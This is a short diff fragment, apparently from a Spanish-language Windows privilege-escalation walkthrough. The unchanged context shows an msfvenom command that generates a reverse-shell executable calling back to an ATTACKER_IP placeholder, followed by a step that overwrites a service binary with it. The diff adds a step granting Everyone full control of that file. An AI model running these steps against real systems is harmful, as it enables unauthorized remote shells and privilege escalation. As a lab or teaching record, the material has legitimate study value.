@@ -51,6 +51,10 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe 
 ```cmd
 copy /Y WService.exe "C:\PROGRA~2\SYSTEM~1\WService.exe"
 ```
+**2.b le das permisos**
+```
+icacls WService.exe /grant Everyone:F
+```
 
 **3. Forzar ejecución**
 
